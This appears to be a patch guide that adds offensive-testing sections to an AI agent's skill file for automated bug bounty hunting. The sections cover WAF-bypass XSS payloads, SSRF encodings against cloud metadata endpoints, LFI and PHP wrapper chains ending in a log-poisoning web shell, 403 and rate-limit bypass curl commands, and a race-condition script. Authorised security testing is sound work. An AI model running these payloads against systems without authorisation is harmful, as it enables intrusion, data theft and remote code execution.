# DastAutomation Upgrades for BugBountyHunter

These are additions made to the `DastAutomation/SKILL.md` skill file to support the BugBountyHunter system. If you have the `ai-security-arsenal` installed, apply these sections to your existing `DastAutomation/SKILL.md`.

## What Was Changed

1. **Replaced Playwright MCP with dev-browser CLI** throughout the skill
2. **Added WAF-specific XSS bypass payloads** (6 providers) referencing `Security/Payloads/xss.yaml`
3. **Added SSRF IP encoding permutation engine** (8 variants) referencing `Security/Payloads/ssrf.yaml`
4. **Added LFI PHP wrapper chain** (14 techniques) referencing `Security/Payloads/lfi.yaml`
5. **Added 403 bypass techniques** referencing `Security/Payloads/403-bypass.yaml`
6. **Added rate limit (429) bypass techniques** referencing `Security/Payloads/rate-limit-bypass.yaml`
7. **Added single-packet race condition testing** (James Kettle technique)

## Sections to Add

### 1. WAF Detection and Bypass (add to XSS/injection testing phase)

Add this section to your XSS testing phase. It detects the WAF in use and loads the appropriate bypass payloads:

```markdown
### WAF Detection and Bypass Intelligence

Before testing injection payloads, detect the WAF:

1. **Check response headers for WAF signatures:**
   - `cf-ray` or `cf-cache-status` --> Cloudflare
   - `x-imperva-id` or `x-cdn: Imperva` --> Imperva
   - `x-amz-cf-id` or `x-amz-cf-pop` --> CloudFront
   - `server: AkamaiGHost` --> Akamai
   - `x-sucuri-id` --> Sucuri
   - Check for `mod_security` or `OWASP CRS` in 403 responses --> ModSecurity
   - `server: awselb` or AWS WAF headers --> AWS WAF

2. **Load WAF-specific bypass payloads:**
   ```bash
   # Read the payload database
   cat ~/.claude/skills/Security/Payloads/xss.yaml
   ```
   - If no WAF detected: use `generic` payloads first
   - If WAF detected: use `waf_bypasses.{provider}` payloads
   - Test generic payloads first, then escalate to WAF-specific if blocked

3. **Context-aware payload selection:**
   - HTML body context: `<script>`, `<img>`, `<svg>` payloads
   - HTML attribute context: event handler payloads (`" onfocus=alert(1) autofocus="`)
   - JavaScript string context: string break payloads (`';alert(1)//`)
   - Template literal context: expression payloads (`${alert(1)}`)
```

### 2. SSRF IP Encoding Permutation Engine (add to SSRF testing phase)

```markdown
### SSRF IP Encoding Permutation Engine

For every SSRF candidate parameter, test ALL encoding variants from the payload database:

```bash
cat ~/.claude/skills/Security/Payloads/ssrf.yaml
```

**Systematic testing order:**
1. Standard IP: `http://169.254.169.254/latest/meta-data/`
2. Decimal: `http://2852039166/`
3. Hex: `http://0xa9fea9fe/`
4. Octal: `http://0251.0376.0251.0376/`
5. Mixed: `http://169.0xfe.0251.254/`
6. URL-encoded: `http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/`
7. IPv6: `http://[::ffff:a9fe:a9fe]/`
8. DNS rebinding: use interactsh or rebind.network

**Protocol smuggling:** Test each parameter with `file://`, `dict://`, `gopher://`, `ftp://`, `tftp://` schemes.

**Cloud metadata endpoints:** Test AWS IMDSv1, IMDSv2 (PUT token request), GCP (Metadata-Flavor header), Azure (Metadata header).

**Redirect chain SSRF:** If URL parameter accepts external URLs, host a redirect to internal IPs:
```bash
# Your server returns 302 to http://169.254.169.254/latest/meta-data/
curl -v "https://target.com/fetch?url=https://your-server.com/redirect"
```
```

### 3. LFI PHP Wrapper Chain (add to injection testing or as new phase)

```markdown
### LFI Testing with PHP Wrapper Chain

Load payloads from `~/.claude/skills/Security/Payloads/lfi.yaml` and test systematically:

**14 LFI techniques in order:**
1. Basic traversal: `../../../etc/passwd`
2. URL-encoded: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
3. Double URL-encoded: `%252e%252e%252f`
4. UTF-8 encoded: `..%c0%af..%c0%af`
5. Null byte (legacy): `../../../etc/passwd%00`
6. Path truncation: `../../../etc/passwd.....[long]`
7. PHP filter (base64): `php://filter/convert.base64-encode/resource=index.php`
8. PHP filter (rot13): `php://filter/string.rot13/resource=index.php`
9. PHP input: `php://input` (with POST body containing PHP code)
10. PHP data: `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`
11. PHP expect: `expect://id`
12. PHP zip: upload ZIP, reference inner file via `zip://`
13. PHP phar: upload PHAR, trigger deserialization
14. Log poisoning: inject PHP into access log, then include log file

**PHP wrapper chain for RCE:**
1. Use `php://filter/convert.base64-encode/resource=` to read source code
2. Identify writable paths from source code (upload dirs, tmp dirs, log paths)
3. Use `php://input` or `data://` with POST body for code execution
4. If blocked, try log poisoning: inject `<?php system($_GET['cmd']); ?>` in User-Agent, include the log
```

### 4. 403 and Rate Limit Bypass (add as pre-test step)

```markdown
### 403 Forbidden Bypass

When any endpoint returns 403, automatically try bypasses from `~/.claude/skills/Security/Payloads/403-bypass.yaml`:

**Header-based bypasses:**
```bash
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /admin" https://target.com/
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/admin
curl -H "X-Real-IP: 127.0.0.1" https://target.com/admin
curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target.com/admin
```

**Path-based bypasses:**
```bash
curl https://target.com/./admin
curl https://target.com//admin
curl https://target.com/admin/..;/
curl https://target.com/admin%20
curl https://target.com/admin%09
curl https://target.com/ADMIN  # case variation
curl https://target.com/admin.json
```

**Method-based bypasses:**
```bash
curl -X TRACE https://target.com/admin
curl -H "X-HTTP-Method-Override: GET" -X POST https://target.com/admin
```

### Rate Limit (429) Bypass

When rate-limited, try bypasses from `~/.claude/skills/Security/Payloads/rate-limit-bypass.yaml`:

**Header rotation:**
```bash
curl -H "X-Forwarded-For: 1.2.3.4" https://target.com/api/login
curl -H "X-Real-IP: 5.6.7.8" https://target.com/api/login
curl -H "X-Originating-IP: 9.10.11.12" https://target.com/api/login
```

**Path variation:**
```bash
curl https://target.com/api/login
curl https://target.com/api/login/
curl https://target.com/api/Login
curl https://target.com/api/login?x=1
```
```

### 5. Single-Packet Race Condition Testing (add to business logic phase)

```markdown
### Single-Packet Race Condition Testing (James Kettle Technique)

For race-sensitive operations (coupon redemption, fund transfer, vote/like, account creation):

**HTTP/2 multiplexed approach:**
Send multiple requests in a single TCP packet so they arrive simultaneously at the server:

```bash
# Using curl with HTTP/2 multiplexing -- send 10 coupon redemptions simultaneously
for i in $(seq 1 10); do
  curl --http2 -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/redeem" \
    -H "Cookie: session=SESSION" \
    -d '{"coupon":"DISCOUNT20"}' &
done
wait
```

**Detection:** Compare results of sequential vs parallel execution:
- Sequential: 1 success, 9 failures (correct behavior)
- Parallel: multiple successes = race condition vulnerability

**High-value targets for race testing:**
- Coupon/promo code redemption
- Fund transfers between accounts
- Voting/liking/rating actions
- Account creation (duplicate detection bypass)
- MFA code verification (attempt multiple codes simultaneously)
- Withdrawal requests
- Limited inventory purchase
```

### 6. dev-browser Migration (replace Playwright MCP references)

Replace all Playwright MCP tool calls with dev-browser CLI:

```markdown
# Old (Playwright MCP):
mcp__playwright__browser_navigate(url="https://target.com")
mcp__playwright__browser_snapshot()
mcp__playwright__browser_click(element="Login", ref="s12e45")

# New (dev-browser):
dev-browser --ignore-https-errors <<'EOF'
const page = await browser.getPage("dast-test");
await page.goto("https://target.com");
const snapshot = await page.snapshotForAI();
console.log(snapshot.full);
await page.click("text=Login");
EOF
```

Key dev-browser advantages for DAST:
- `--ignore-https-errors` for self-signed certs
- Named pages persist across scripts (`browser.getPage("auth")`)
- `snapshotForAI()` for AI-optimized DOM representation
- Script-based -- each test is a focused, reproducible script
